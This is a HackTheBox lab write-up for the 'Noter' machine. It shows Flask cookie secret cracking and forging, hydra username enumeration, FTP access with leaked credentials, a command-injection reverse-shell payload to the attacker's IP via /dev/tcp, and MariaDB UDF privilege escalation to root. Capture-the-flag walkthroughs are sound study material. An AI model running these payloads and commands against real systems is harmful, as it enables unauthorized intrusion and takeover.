---
title: HTB | Noter
author: Zeropio
date: 2022-08-29
categories: [Pentesting, HackTheBox]
tags: [htb, linux, medium, machines]
permalink: /pentesting/htb/machines/noter
---

![HTB Img](/assets/img/hackthebox/card/Noter.png)

# Fingerprinting

The nmap gives us:

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Noter
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

If we created and account we can see a cookie after login.

# Footprinting

The **anonymous** user for FTP doesn’t work.

We can check the cookie we have: `eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiemVybyJ9.Ywyj5A.uzkuRLWLxKI9ty3BHCUOWVr9Szo` . We can use `flask-unsign`, from Python, to decrypt the cookie.

```console
zero@pio$ flask-unsign --unsign --no-literal-eval --wordlist /usr/share/wordlists/rockyou.txt --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiemVybyJ9.Ywyj5A.uzkuRLWLxKI9ty3BHCUOWVr9Szo'
[*] Session decodes to: {'logged_in': True, 'username': 'zero'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 17024 attempts
b'secret123'
```

We must use `—unsign`  to specify that we are using a wordlist, and `--no-literal-eval` to allow the cookie as a string (if not we get an error). We can see that the output differs from a invalid password than an invalid username, so we can try to get a list of valid users. Let’s use `hydra` for this:

```console
zero@pio$ hydra -L /usr/share/seclists/Usernames/Names/names.txt -p 'test' 10.10.11.160 -s 5000 http-post-form '/login:username=^USER^&password=test:S=<div class="alert alert-danger">Invalid login</div>'

[5000][http-post-form] host: 10.10.11.160   login: blue   password: test
```

Now we can use flask-unsign to generate the cookie, using the same format as our cookie:

```console
zero@pio$ flask-unsign --sign --secret 'secret123' --cookie "{'logged_in': True, 'username': 'blue'}"
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YwypQA.7rj51Sgyf-usb-tvmGo4CKREIkk
```

And now we are in the blue user account:

![Untitled](/assets/img/hackthebox/labs/noter/Untitled.png)

Inside the premium notes, we can see the credentials `blue:blue@Noter!` . We can test the credentials works:

```console
zero@pio$ tp blue@10.10.11.160                                                                      
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
```

We can get a pdf with the password policy. There we can see that the default password is `username@site_name!`. In the note we can saw that is signed by the **ftp_admin** user, if we try the default password (`ftp_admin@Noter!`):

```console
zero@pio$ ftp ftp_admin@10.10.11.160
```

Inside we can see two zip files. Inside of them are the source code of the web. In one of them can be found the following lines:

```python
# Config MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'DB_user'
app.config['MYSQL_PASSWORD'] = 'DB_password'
app.config['MYSQL_DB'] = 'app'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'
```

As well as the secret:

```python
if __name__ == '__main__':
    app.secret_key='secret123'
    app.run(host="0.0.0.0",debug=False)
```

In the other, we have a non-default credentials:

```python
# Config MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'Nildogg36'
app.config['MYSQL_DB'] = 'app'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'
```

We cannot use the credentials for SSH. Also, the machine doesn’t have an opened port of MySQL so we cannot connect to it.

Going back to the web, we can see we can export notes from an URL to the server. In the source code, the app access this through a get. We will create a **shell.md** file with the content `--';bash -i >& /dev/tcp/10.10.16.44/443 0>&1;'—` . Open a netcat, and launch the file. Now we are inside the system. 

# Privilege Escalation

We can see is vulnerable to **CVE-2021-3560**, but using this [PoC](https://raw.githubusercontent.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/main/poc.sh) we see that the machine doesn’t have **Gnome-Control-Center**, necessary for the exploit.

We can try another path. The MySQL version is also vulnerable. Using this [exploit](https://www.exploit-db.com/exploits/1518) we can make it work. Download the exploit into the machine and follow the exploit. First, compile it:

```console
svc@noter:~$ gcc -g -c 1518.c
svc@noter:~$ gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc
```

Following the instructions (we must change the path we upload the script from the exploitdb):

```console
svc@noter:~$ mysql -u'root' -p'Nildogg36'
MariaDB [(none)]> use mysql;
MariaDB [mysql]> create table foo(line blob);
MariaDB [mysql]> insert into foo values(load_file('/home/svc/1518.so'));
MariaDB [mysql]> select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/1518.so';
MariaDB [mysql]> create function do_system returns integer soname '1518.so';
MariaDB [mysql]> select * from mysql.func;
MariaDB [mysql]> select do_system('chmod u+s /bin/bash');
MariaDB [mysql]> exit
```

If everything works:

```console
svc@noter:~$ bash -p
bash-5.0# whoami
	root
```
